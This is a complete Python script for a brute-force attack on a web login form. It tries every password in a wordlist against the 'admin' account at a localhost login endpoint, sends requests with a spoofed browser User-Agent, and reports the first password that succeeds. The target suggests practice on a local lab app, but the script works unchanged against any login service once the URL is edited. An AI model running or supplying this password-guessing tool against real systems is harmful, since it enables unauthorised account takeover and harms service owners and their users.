import requests
import json

# Target URL of the login page
url = 'http://localhost:5005/login'

# Username to test the brute force attack against
username = 'admin'

# Path to the file containing the list of passwords to try
password_file = 'passwords.txt'

# Headers to mimic a real browser request (optional)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Content-Type': 'application/json'
}

# open password file and print each password
# Open the file in read mode
with open(password_file, 'r') as file:
    # Loop through each line in the file
    for line in file:
        # Strip the newline character from the end of each line
        password = line.strip()
        # Now you can work with each password
        print(password)

        # Data payload for POST request
        data = {
            'username': username, 
            'password': password,
            'token': '', 
        }

        # Convert data to JSON
        data = json.dumps(data)
        
        # Make the POST request to the login form
        response = requests.post(url, data=data, headers=headers)
        
        # Check if login was successful
        if 'Login successful' in response.text:
            print(f'Response: {response.text}')
            print(f'Success! Username: {username} Password: {password}')
            break
        
        else:
            print(f'Response: {response.text}')
            print(f'Failed attempt with password: {password}')

